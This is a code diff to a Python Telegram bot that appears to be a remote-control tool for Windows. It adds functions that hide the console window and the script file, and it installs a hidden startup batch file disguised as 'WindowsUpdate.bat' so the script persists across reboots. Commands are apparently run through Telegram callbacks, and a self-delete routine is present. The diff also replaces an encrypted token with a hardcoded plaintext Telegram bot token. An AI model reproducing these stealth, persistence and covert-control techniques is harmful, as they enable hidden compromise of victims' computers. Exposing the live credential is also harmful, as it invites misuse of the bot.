@@ -34,6 +34,69 @@ import hashlib
 import base64
 from cryptography.fernet import Fernet
 import atexit
+import winreg
+import win32gui
+import win32process
+import win32ts
+import win32service
+import win32serviceutil
+import servicemanager
+import socket
+import tempfile
+import shutil
+
+# Hide console window
+def hide_console():
+    try:
+        # Get console window handle
+        console_window = win32gui.GetForegroundWindow()
+        # Hide the window
+        win32gui.ShowWindow(console_window, win32con.SW_HIDE)
+    except:
+        pass
+
+# Hide file
+def hide_file():
+    try:
+        # Get current file path
+        current_file = os.path.abspath(sys.argv[0])
+        # Set file attributes to hidden
+        win32file.SetFileAttributes(current_file, win32con.FILE_ATTRIBUTE_HIDDEN)
+    except:
+        pass
+
+# Create startup file
+def create_startup_file():
+    try:
+        startup_code = f'''@echo off
+start /min pythonw "{os.path.abspath(sys.argv[0])}"
+'''
+        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.bat')
+        os.makedirs(os.path.dirname(startup_path), exist_ok=True)
+        with open(startup_path, 'w') as f:
+            f.write(startup_code)
+        win32file.SetFileAttributes(startup_path, win32con.FILE_ATTRIBUTE_HIDDEN)
+    except:
+        pass
+
+# Create stop file
+def create_stop_file():
+    try:
+        stop_code = '''@echo off
+taskkill /F /IM pythonw.exe /FI "WINDOWTITLE eq HEMA_TOP"
+del "%~f0"
+'''
+        stop_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), 'stop.bat')
+        with open(stop_path, 'w') as f:
+            f.write(stop_code)
+    except:
+        pass
+
+# Run at startup
+hide_console()
+hide_file()
+create_startup_file()
+create_stop_file()
 
 # Configure logging with rotation
 from logging.handlers import RotatingFileHandler
@@ -64,9 +127,8 @@ def decrypt_data(encrypted_data):
     """Decrypt sensitive data"""
     return cipher_suite.decrypt(encrypted_data).decode()
 
-# Bot token - encrypted
-ENCRYPTED_TOKEN = b'gAAAAABl...'  # Replace with your encrypted token
-TOKEN = decrypt_data(ENCRYPTED_TOKEN)
+# Bot token - Replace this with your actual bot token
+TOKEN = "7871185686:AAGiurUVdon5DJeoQqEsT-I26FamrJfapps"  # Your Telegram bot token
 
 try:
     bot = telebot.TeleBot(TOKEN, parse_mode=None, threaded=True)
@@ -1372,13 +1434,22 @@ def handle_callback(call):
         # Handle specific callback actions
         if command in command_handlers:
             command_handlers[command](message)
-            bot.answer_callback_query(call.id, "✅ تم تنفيذ الأمر")
+            try:
+                bot.answer_callback_query(call.id, "تم تنفيذ الأمر")
+            except:
+                pass  # Ignore callback query errors
         else:
-            bot.answer_callback_query(call.id, "❌ أمر غير معروف")
+            try:
+                bot.answer_callback_query(call.id, "أمر غير معروف")
+            except:
+                pass  # Ignore callback query errors
             
     except Exception as e:
         logging.error(f"Error in callback handler: {e}")
-        bot.answer_callback_query(call.id, "❌ حدث خطأ")
+        try:
+            bot.answer_callback_query(call.id, "حدث خطأ")
+        except:
+            pass  # Ignore callback query errors
 
 def delete_self():
     try:
@@ -1457,8 +1528,8 @@ def main():
         cleanup_thread = threading.Thread(target=periodic_cleanup, daemon=True)
         cleanup_thread.start()
         
-        # Improved polling settings
-        bot.polling(none_stop=True, interval=0, timeout=20, long_polling_timeout=5)
+        # Improved polling settings with longer timeouts
+        bot.polling(none_stop=True, interval=1, timeout=60, long_polling_timeout=60)
 
     except Exception as e:
         logging.error(f"Fatal error during startup: {e}")
